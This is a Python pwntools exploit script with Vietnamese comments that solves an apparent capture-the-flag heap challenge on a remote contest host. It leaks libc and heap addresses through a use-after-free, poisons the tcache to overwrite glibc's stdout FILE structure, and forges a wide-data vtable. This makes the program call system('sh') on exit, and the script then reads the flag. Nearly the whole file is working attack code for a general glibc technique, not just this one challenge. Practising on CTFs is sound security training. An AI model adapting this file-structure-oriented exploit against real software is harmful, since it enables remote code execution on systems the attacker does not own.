#!/usr/bin/env python3
from pwn import *

# Cấu hình binary
exe = ELF("./chal")
libc = ELF("./libc.so.6")
context.binary = exe
context.log_level = 'info'

def alloc_smart(r, idx, size, data):
    r.sendlineafter(b"> ", b"1")
    # Gửi "idx size data".
    # scanf đọc idx, size. Dấu cách sau size bị scanf nuốt.
    # read đọc data ngay lập tức. Payload nằm chính xác tại offset 0.
    payload = f"{idx} {size} ".encode() + data
    r.sendafter(b"idx?: ", payload)

def free(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"idx?: ", str(idx).encode())

def view(r, idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"idx?: ", str(idx).encode())
    r.recvuntil(b"meow: ")
    return r.recv(8) # Đọc 8 byte đầu tiên

def edit_smart(r, idx, data):
    r.sendlineafter(b"> ", b"4")
    # Gửi "idx data".
    # scanf đọc idx. read đọc data.
    payload = f"{idx} ".encode() + data
    r.sendafter(b"idx?: ", payload)

def exploit():
    while True:
        r = None
        try:
            r = remote("chall.polygl0ts.ch", 6242)
            
            log.info("Starting Exploit (Direct Leak + Zero Shift)...")

            # 1. Setup Chunks
            # Alloc Large (0x500)
            r.sendlineafter(b"> ", b"1")
            r.sendlineafter(b"idx?: ", b"0")
            r.sendlineafter(b"size?: ", b"1280")
            r.sendafter(b"data?: ", b"Large")

            # Alloc Small (0x150)
            r.sendlineafter(b"> ", b"1")
            r.sendlineafter(b"idx?: ", b"1")
            r.sendlineafter(b"size?: ", b"336")
            r.sendafter(b"data?: ", b"Small")

            # 2. Leak Libc (Direct View Unsorted Bin)
            free(r, 0)
            leak = view(r, 0) # Đọc trực tiếp chunk đã free
            libc_leak = u64(leak.ljust(8, b"\x00"))
            
            # Tính Libc Base
            offset_leak = libc.sym['__malloc_hook'] + 0x10 + 96
            libc.address = libc_leak - offset_leak
            
            if libc.address & 0xFFF != 0:
                log.warning("Libc unaligned. Retrying...")
                r.close()
                continue
            log.success(f"Libc Base: {hex(libc.address)}")

            # 3. Leak Heap (Direct View Tcache)
            free(r, 1)
            leak = view(r, 1)
            # Tcache next pointer (offset 0) chứa: 0 ^ (HeapBase >> 12)
            heap_leak = u64(leak.ljust(8, b"\x00"))
            heap_base = heap_leak << 12
            log.success(f"Heap Base: {hex(heap_base)}")

            # 4. Poison Tcache
            target = libc.sym['_IO_2_1_stdout_']
            encrypted_ptr = heap_leak ^ target
            
            # Tránh ký tự số ở đầu payload (scanf safety)
            if 0x30 <= (encrypted_ptr & 0xFF) <= 0x39:
                log.warning("Encrypted ptr starts with digit. Retrying...")
                r.close()
                continue
            
            # Ghi đè next pointer
            edit_smart(r, 1, p64(encrypted_ptr))

            # 5. Alloc Fake Structs (vào Chunk 1)
            chunk1_addr = heap_base + 0x7b0
            
            # Payload Fake Structs (Offset CHUẨN - Zero Shift)
            fake_structs = flat({
                0x20: 1,                  # _IO_write_ptr = 1
                0x68: libc.sym['system'], # doallocate -> system
                0xe0: chunk1_addr         # _wide_vtable -> self
            }, filler=b'\x00', length=0x150)
            
            alloc_smart(r, 1, 0x150, fake_structs)

            # 6. Alloc FSOP Payload (vào stdout)
            lock_addr = chunk1_addr + 0x100 # Vùng writable chứa 0
            
            # Payload FSOP (Offset CHUẨN)
            file_payload = flat({
                0x0:  b"  sh;",         # _flags: lệnh shell
                0x28: 1,                # _IO_write_ptr > _IO_write_base
                0x88: lock_addr,        # _lock -> clean memory
                0xa0: chunk1_addr,      # _wide_data -> Chunk 1
                0xc0: 1,                # _mode = 1 (Bypass puts)
                0xd8: libc.sym['_IO_wfile_jumps'] # vtable
            }, filler=b'\x00', length=0x150)
            
            alloc_smart(r, 1, 0x150, file_payload)

            log.success("Exploit sent! Triggering via Exit...")
            
            # Gửi 5 để Exit -> Trigger FSOP
            r.sendlineafter(b"> ", b"5")
            
            r.sendline(b"cat flag")
            r.interactive()
            break

        except Exception as e:
            if r: r.close()

if __name__ == "__main__":
    exploit()